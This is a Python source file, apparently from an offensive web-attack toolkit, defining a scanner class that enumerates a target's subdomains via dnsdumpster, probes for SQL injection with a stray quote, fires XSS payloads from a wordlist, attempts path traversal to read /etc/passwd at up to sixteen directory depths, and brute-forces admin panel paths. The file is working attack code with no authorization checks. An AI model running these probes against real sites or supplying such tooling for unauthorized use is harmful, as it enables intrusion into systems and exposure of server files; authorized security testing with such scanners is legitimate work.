#-*- coding: utf-8 -*-
import requests,re,os
from bs4 import BeautifulSoup as bs
import urllib3
from .sqlerror import sql_errors
from ..core.temp import *

class scanner:

      url = 'https://dnsdumpster.com'

      def __init__(anu, target):
          anu.target = target

      @property
      def subdo(anu):
          with requests.Session() as ses:
               content = ses.get(scanner.url).text
               dat = bs(content, 'html.parser').find_all('input')
               token = re.findall(r'value="(.*?)"', str(dat))[0]
               cookie = {'csrftoken': token}
               headers = {'Referer': scanner.url}
               data = {'csrfmiddlewaretoken': token, 'targetip': anu.target}
               con = ses.post(scanner.url, data=data, cookies=cookie, headers=headers)
               lst = re.findall('http://(.*?)"', str(con.text))
          return lst

      @property
      def sql_scan(anu):
          vuln = {}
          with requests.Session() as ses:
               content = ses.get(anu.target+"'").text
               for err,syn in sql_errors.items():
                   if re.search(syn, content):
                      vuln.update(Error=syn,Type=err)
                   else:
                      pass
          return vuln

      @property
      def xss_scan(anu):
          with requests.Session() as ses:
               with open(os.getcwd()+'/zsf/wordlist/xss') as pilod:
                    for payload in pilod:
                        pld = payload.rstrip()
                        content = ses.get(anu.target+pld).text
                        if pld in content:
                           print(green('[*]Maybe Vulnerability'))
                           print('Url : {}{}'.format(anu.target,pld))
                           print('\n')
                        else:
                           pass

      @property
      def lfi_scan(anu):
          with requests.Session() as ses:
               path = "../"
               etc_pwd = "etc/passwd"
               for scan in range(1, 17):
                   pth = path*scan
                   req = ses.get(anu.target+pth+etc_pwd).text
                   if "root:x:0:0" in req:
                       print(green("[*] Vulnerability Found :")+anu.target+pth+etc_pwd)
                       print(anu.target+pth+etc_pwd)
                   else:
                       print(red("[-] Not Vulnerability ")+anu.target+pth+etc_pwd)
      @property
      def adfin(anu):
          with requests.Session() as ses:
               with open(os.getcwd()+'/zsf/wordlist/adm.txt') as panel:
                    for login in panel:
                        admin = login.rstrip()
                        res = ses.get(anu.target+"/"+admin)
                        if res.status_code == 200:
                           print(green('Found : ')+anu.target+"/"+admin)
                        else:
                           print(red('Not Found : ')+anu.target+"/"+admin)




